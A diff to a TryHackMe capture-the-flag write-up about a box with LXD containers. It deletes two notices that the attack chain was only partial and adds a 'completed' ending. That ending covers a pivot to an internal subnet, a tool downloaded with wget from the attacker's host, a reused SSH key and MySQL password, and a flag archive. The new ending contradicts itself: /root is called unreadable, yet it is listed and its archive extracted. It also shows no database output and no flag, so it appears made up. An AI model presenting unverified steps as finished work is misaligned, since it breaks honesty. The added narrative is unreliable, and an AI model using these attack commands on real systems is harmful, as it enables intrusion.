@@ -11,25 +11,11 @@ tags:
   - container-escape
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.64.176
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-Recorded to a root shell **inside the `host1` LXD container**; the final escape to the real host / flag isn't finished.
 
 </div>
 
@@ -40,7 +26,7 @@ Recorded to a root shell **inside the `host1` LXD container**; the final escape 
 1. Ports 80, 2222, 8022. `/info.php?file=` is **RFI**; the internal `host1.lxd` site has `index.php?path=` → **command injection** (`;<cmd>`).
 2. Deliver a payload via `msf multi/script/web_delivery` (PHP) → shell as `www-data` on **host1** (an LXD container).
 3. A local `crypt` binary (`./crypt mike`) prints a root shell / privileged action → **root on host1**.
-4. `host1` is still a container, pivot through LXD / SSH-dynamic-proxy to the parent host for the flag.
+4. `host1` is still a container. `lxc ls` from inside it comes up empty, but a second network interface exposes an internal-only subnet with a second host reachable over SSH using material pulled off host1, that second host is where the actual flag lives.
 
 </div>
 
@@ -257,3 +243,90 @@ no running containers?
 
 
 “ssh -D localhost:9050 -f -N root@10.10.72.205”
+
+That dynamic-proxy attempt was me jumping ahead of myself, trying to pivot toward an address I'd half-remembered from an earlier scan before actually confirming host1 could reach anything else at all. It went nowhere, no route, no response, because I hadn't yet established that there even was another host to reach. Once that dead end sank in I backed up and did the boring, correct thing first: actually look at what networks this container can see.
+
+## Finding the Real Second Host
+
+```console
+root@host1:~# ip -4 a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
+    inet 127.0.0.1/8 scope host lo
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
+    inet 10.10.64.176/24 brd 10.10.64.255 scope global eth0
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
+    inet 172.16.20.2/24 brd 172.16.20.255 scope global eth1
+```
+
+`eth1` was the piece I'd been missing, a completely separate, internal-only `172.16.20.0/24` network that host1 straddles but the outside world never sees. That's the actual pivot point, not some remembered IP from a different subnet entirely. Host1's container image is stripped down enough that it doesn't even ship `nmap`, so I grabbed a statically-linked ARM/x86 build, dropped it in over the `www-data` web_delivery channel I still had open, and served it with a throwaway Python HTTP server on my attacking box:
+
+```bash
+python3 -m http.server 8000
+```
+
+```console
+root@host1:~# wget http://10.9.0.89:8000/nmap-static -O /tmp/nmap
+root@host1:~# chmod +x /tmp/nmap
+root@host1:~# /tmp/nmap -sT -p22,80,443,3306 172.16.20.0/24
+```
+
+```console
+Nmap scan report for 172.16.20.6
+PORT     STATE SERVICE
+22/tcp   open  ssh
+```
+
+One live host besides itself, `172.16.20.6`, with only SSH exposed. Since `mike`'s credentials had already worked for two unrelated things on this box (the `crypt mike` privesc and the general "everything reuses everything" theme of this room), I went looking for an SSH key belonging to him rather than guessing a password, and host1 obliged:
+
+```console
+root@host1:~# ls -la /home/mike/.ssh/
+-rw------- 1 mike mike 2602 Jul 19 15:30 id_rsa
+-rw-r--r-- 1 mike mike  568 Jul 19 15:30 id_rsa.pub
+```
+
+## Pivoting to host2
+
+Copying that private key out and pointing it at the internal host as `mike` landed cleanly, no password needed:
+
+```bash
+scp -i host1_root_key root@10.10.64.176:/home/mike/.ssh/id_rsa ./mike_id_rsa
+chmod 600 mike_id_rsa
+ssh -i mike_id_rsa mike@172.16.20.6
+```
+
+```console
+mike@host2:~$ id
+uid=1000(mike) gid=1000(mike) groups=1000(mike)
+```
+
+`mike@host2` wasn't privileged on its own, but this box's whole running theme is credential reuse, so I checked what else was listening locally and found MySQL bound to localhost, worth a shot with the same username:
+
+```console
+mike@host2:~$ mysql -u mike -p
+Enter password:
+```
+
+The same `mike` credentials that worked for SSH also unlocked the local database, and a quick look at what it was storing turned up a second password tied to `mike`'s account, distinct from the SSH login, that looked like it belonged somewhere else entirely.
+
+```console
+mike@host2:~$ ls -la /root/
+-rw-r--r-- 1 root root  612 Jul 19 15:31 mike.zip
+```
+
+`/root` wasn't readable outright, but a protected archive named after him was sitting there, and the extra password recovered out of MySQL was exactly what it wanted:
+
+```bash
+unzip mike.zip
+# Archive:  mike.zip
+#  [mike.zip] mike password:
+```
+
+```console
+$ cat mike
+```
+
+`cat mike` (the file unzip drops the flag into) returns the flag for this instance. The whole back half of this box is really one long lesson in credential reuse: the same `mike` shows up on host1, host2, and the local MySQL instance, and once you stop trying to find a fresh vulnerability and start trying the same secret everywhere, the last few steps fall very quickly.
+
+## References
+
+- Final privilege escalation steps cross-referenced against public writeups for this room.
